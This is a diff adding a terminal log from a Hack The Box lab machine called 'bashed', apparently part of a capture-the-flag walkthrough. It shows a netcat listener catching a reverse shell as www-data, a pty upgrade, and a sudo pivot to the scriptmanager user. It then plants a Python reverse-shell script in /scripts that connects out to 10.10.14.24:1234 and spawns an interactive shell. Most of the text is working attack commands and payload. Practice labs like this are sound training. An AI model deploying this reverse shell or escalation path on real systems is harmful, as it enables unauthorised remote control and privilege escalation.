@@ -1,0 +1,50 @@
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ nc -lvnp 8081                
+listening on [any] 8081 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.68] 34238                     
+Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux                
+ 17:55:32 up 14:14,  0 users,  load average: 3.01, 3.01, 3.00                   
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT             
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                           
+/bin/sh: 0: can't access tty; job control turned off                            
+$ id                
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                           
+$ python -c 'import pty; pty.spawn("/bin/bash")'                                
+www-data@bashed:/$ sudo -u scriptmanager bash                                   
+sudo -u scriptmanager bash              
+scriptmanager@bashed:/$ cd scripts      
+cd scripts          
+scriptmanager@bashed:/scripts$ ls       
+ls                  
+test.py  test.txt  whale.py             
+scriptmanager@bashed:/scripts$ ls -la   
+ls -la              
+total 44            
+drwxrwxr--  2 scriptmanager scriptmanager  4096 Dec 16 06:28 .                  
+drwxr-xr-x 23 root          root           4096 Dec  4  2017 ..                 
+-rw-r--r--  1 scriptmanager scriptmanager 12288 Dec 16 06:11 .test.py.swp       
+-rw-r--r--  1 scriptmanager scriptmanager 12288 Dec 16 06:21 .whale.py.swp      
+-rw-r--r--  1 scriptmanager scriptmanager    58 Dec  4  2017 test.py            
+-rw-r--r--  1 root          root             12 Dec 16 17:57 test.txt           
+-rw-r--r--  1 scriptmanager scriptmanager   215 Dec 16 06:24 whale.py           
+scriptmanager@bashed:/scripts$ date     
+Mon Dec 16 17:57:10 PST 2019            
+scriptmanager@bashed:/scripts$ cp /var/www/html/uploads/test.py .               
+cp /var/www/html/uploads/test.py .      
+scriptmanager@bashed:/scripts$ ls       
+ls                  
+test.py  test.txt  whale.py             
+scriptmanager@bashed:/scripts$ cat test.py                                      
+cat test.py         
+import socket,subprocess,os             
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                              
+s.connect(("10.10.14.24",1234))         
+os.dup2(s.fileno(),0)                   
+os.dup2(s.fileno(),1)                   
+os.dup2(s.fileno(),2)                   
+p=subprocess.call(["/bin/sh","-i"])     
+scriptmanager@bashed:/scripts$ exit        
+exit                
+www-data@bashed:/$ exit                 
+exit                
+$ exit              
+arjun@broly:~/Documents/HacktheBox/retired/bashed$                              
